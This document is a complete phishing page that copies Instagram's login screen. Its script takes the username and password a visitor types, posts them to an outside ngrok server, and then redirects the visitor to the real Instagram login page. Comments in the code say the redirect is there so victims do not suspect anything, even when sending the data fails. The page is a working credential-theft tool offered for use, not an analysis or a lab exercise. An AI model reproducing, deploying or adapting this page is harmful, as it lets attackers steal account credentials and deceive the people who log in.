<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { box-sizing: border-box; }
        
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            color: white;
        }

        .main-wrapper {
            display: flex;
            min-height: 100vh;
            width: 100%;
            justify-content: center;
            align-items: center;
        }

        /* --- LEFT SIDE (Visual Mockups) --- */
        .visual-side {
            display: none; /* Hidden on mobile */
            flex-direction: column;
            justify-content: center;
            align-items: flex-end;
            padding-right: 32px;
        }

        .phone-mockup {
            width: 380px;
            height: 580px;
            background-image: url('https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones-2x.png?__make_it_id=1');
            background-size: contain;
            background-repeat: no-repeat;
            position: relative;
        }

        /* --- RIGHT SIDE (Form Container) --- */
        .form-side {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 350px;
        }

        .login-box {
            width: 100%;
            background-color: #000;
            border: 1px solid #363636;
            padding: 40px;
            margin-bottom: 10px;
            text-align: center;
        }

        .ig-logo-text {
            width: 175px;
            margin-bottom: 24px;
            filter: invert(1); /* Makes the logo white */
        }

        .input-field {
            width: 100%;
            background: #121212;
            border: 1px solid #363636;
            border-radius: 3px;
            padding: 9px 7px;
            margin-bottom: 6px;
            color: white;
            font-size: 12px;
        }

        .input-field:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }

        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin: 8px 0;
        }

        .login-btn:disabled {
            opacity: 0.7;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #363636;
        }

        .divider span { padding: 0 18px; }

        .fb-link {
            color: #385185;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            display: block;
            margin-bottom: 12px;
        }

        .forgot-link {
            color: #e0f1ff;
            font-size: 12px;
            text-decoration: none;
        }

        .signup-box {
            width: 100%;
            background-color: #000;
            border: 1px solid #363636;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        /* --- RESPONSIVE --- */
        @media (min-width: 875px) {
            .visual-side { display: flex; }
        }

        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            font-size: 12px;
            color: #8e8e8e;
            padding: 20px;
            background: #000;
        }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="visual-side">
            <div class="phone-mockup"></div>
        </div>

        <div class="form-side">
            <div class="login-box">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="ig-logo-text" alt="Instagram">
                
                <form id="loginForm" onsubmit="event.preventDefault(); sendData();">
                    <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" required>
                    <input type="password" id="password" class="input-field" placeholder="Password" required>
                    <button type="submit" id="submitBtn" class="login-btn">Log in</button>
                </form>

                <div class="divider"><span>OR</span></div>
                
                <a href="#" class="fb-link">Log in with Facebook</a>
                <a href="#" class="forgot-link">Forgot password?</a>
            </div>

            <div class="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span><span>Help</span><span>API</span><span>Privacy</span><span>Terms</span>
    </div>

<script>
    async function sendData() {
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        const btn = document.getElementById('submitBtn');

        // Visual feedback
        btn.innerText = "Logging in...";
        btn.disabled = true;

        try {
            const response = await fetch('https://uninterruptive-gael-pennate.ngrok-free.dev/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: user, password: pass })
            });
            
            if (response.ok) {
                // Redirect to the actual Instagram login page to finish the "phish"
                window.location.href = "https://www.instagram.com/accounts/login/";
            }
        } catch (error) {
            console.error("Error connecting to server:", error);
            // Even if it fails, redirecting keeps the user from suspecting anything
            window.location.href = "https://www.instagram.com/accounts/login/";
        }
    }
</script>

</body>
</html>
